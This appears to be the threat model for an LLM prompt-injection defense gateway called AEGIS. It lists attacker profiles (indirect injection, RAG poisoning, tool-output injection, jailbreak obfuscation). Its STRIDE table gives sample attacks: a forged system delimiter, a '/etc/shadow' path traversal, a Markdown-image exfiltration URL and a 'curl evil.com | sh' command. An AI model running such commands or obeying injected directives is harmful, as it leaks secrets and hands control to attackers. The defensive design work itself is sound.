# Threat Model: Project AEGIS AI Defense Gateway

## 1. System Assets & Security Objectives

Project AEGIS protects four primary classes of assets in LLM application environments:

| Asset | Description | Security Objective |
| :--- | :--- | :--- |
| **System Directives & Personas** | System prompts, behavioral guardrails, and developer directives | Integrity & Confidentiality: Prevent override or extraction. |
| **Enterprise Credentials & Secrets** | API keys (OpenAI, AWS, Google), DB URLs, and private SSH/RSA keys | Confidentiality: Detect and redact before transmission. |
| **User Privacy & PII** | Credit card numbers, government IDs (Aadhaar, PAN), emails, phones | Privacy: Algorithmic checksum validation and in-place masking. |
| **Tool-Execution Capabilities** | Operating system access, email dispatch, and database modification | Authorization: Prevent unauthorized execution by tainted context. |

---

## 2. Threat Actors & Attacker Capabilities

```
┌────────────────────────────────────────────────────────┐
│                      Attacker                          │
│                                                        │
│  [Web / Document Adversary]   [Untrusted Contributor]  │
│  - Indirect injection in text - Poisoned RAG chunk     │
│  - Hidden CSS / comments      - Delimiter smuggling    │
└───────────────────────────┬────────────────────────────┘
                            │ Manipulated Data
                            ▼
┌────────────────────────────────────────────────────────┐
│                 Trust Boundary (AEGIS)                 │
│                                                        │
│  1. Normalizer (Deobfuscate)   2. Secrets (Redact)     │
│  3. Rules (Signature match)    4. ML Classifier (ONNX) │
│  5. Context (Trust multiplier) 6. Tool Guard (Taint)   │
└───────────────────────────┬────────────────────────────┘
                            │ Sanitized & Verified Payload
                            ▼
┌────────────────────────────────────────────────────────┐
│                   Target LLM / Agent                   │
└────────────────────────────────────────────────────────┘
```

### 2.1 Threat Actor Profiles
1. **Unprivileged Content Adversary:** Places hostile directives inside public web pages, PDFs, or customer tickets read by browsing or summarizing agents.
2. **Untrusted Collaborator:** Uploads poisoned text into shared vector stores or RAG knowledge bases.
3. **Malicious Tool Provider:** Exploits agent tool execution by returning command injection payloads inside tool output.
4. **Adaptive Jailbreaker:** Employs obfuscation (Base64, homoglyphs, cipher framing, persona roleplay) to evade keyword filters.

### 2.2 Attacker Capabilities & Assumptions
- **Attacker has:** Ability to craft arbitrary input text, manipulate external documents, control tool return values, and observe agent responses.
- **Attacker does NOT have:** Operating system access to the gateway machine, filesystem access to model weights or SQLite databases, or access to the HMAC secret salt.

---

## 3. STRIDE Threat Analysis

| Threat Category | Target Component | Threat Scenario | Mitigation in AEGIS |
| :--- | :--- | :--- | :--- |
| **Spoofing** | Chat Delimiters (`R-DELIM-001`) | Attacker inserts `<\|im_start\|>system` to forge a system instruction turn. | Regex detection of raw delimiter tokens; normalizer character unwrapping. |
| **Tampering** | Autonomous Tool Execution (`ToolCallLayer`) | Injected prompt alters `read_file` parameter to `../../etc/shadow`. | Path traversal normalization and capability YAML parameter validation. |
| **Repudiation** | Audit Log Persistence (`EventRepository`) | Attacker attempts to erase or tamper with incident logs. | Salted HMAC-SHA-256 payload hashing; append-only SQLite/PostgreSQL schema. |
| **Information Disclosure** | Canary Tokens & Credentials (`R-EXFIL-001`, `SecretsLayer`) | Prompt extracts system canary token or leaks credentials via Markdown image `![img](https://evil.com/leak?k=...)`. | Response output canary detector; Shannon entropy and Luhn/Verhoeff PII filters. |
| **Denial of Service** | Regular Expression Engine (`test_redos.py`) | Attacker passes pathological nested repetitions to trigger CPU exhaustion. | Bounded regex quantifiers (`[^>\r\n]{0,250}`); request size caps (5 MB); sliding window chunk limit. |
| **Elevation of Privilege** | Agent Capability Guard (`ToolCallLayer`) | Indirect prompt instructs email agent to run `bash -c "curl evil.com \| sh"`. | Context taint tracking blocks dangerous tools when context was influenced by untrusted data. |

---

## 4. Trust Boundaries & Data Classifications

Every string entering AEGIS carries an explicit provenance tag:

```
[System Directive]  ──► Level 0: Trusted ──────► No risk multiplier applied
[User Prompt]       ──► Level 1: Standard ─────► Evaluated against baseline thresholds
[Retrieved Context] ──► Level 2: Untrusted ────► 1.35x risk multiplier for imperatives
[Tool Output]       ──► Level 3: Tainted ──────► 1.45x risk multiplier; blocks high-risk tools
```

---

## 5. In-Scope vs. Out-of-Scope

### In-Scope
- Direct and indirect prompt injection attacks.
- Sensitive data disclosure (API keys, credentials, PII) in prompts or model outputs.
- Unauthorized tool parameter manipulation and path traversal.
- Obfuscation and steganographic evasion techniques.

### Out-of-Scope
- Base model parameter poisoning or weight backdoors at pre-training time.
- Physical hardware side-channel attacks on GPU memory.
- DDoS attacks on network layer 3/4 (mitigated by standard upstream cloud firewalls/WAFs).

---

## 6. Residual Risk & Honest Limitations

1. **Adversarial Novelty:** Highly sophisticated, novel multi-turn semantic attacks without lexical similarity to known datasets may achieve lower detection scores.
2. **Language Coverage:** Current trained ML classifier was trained primarily on English and multilingual Romanized injection corpora; non-Latin script injection coverage relies primarily on the Normalizer and Rules layers.
3. **Upstream Model Trust:** If an upstream LLM suffers from catastrophic hallucination unprompted by adversarial input, the gateway mitigates output leakage via canary tokens but does not correct general factual inaccuracy.
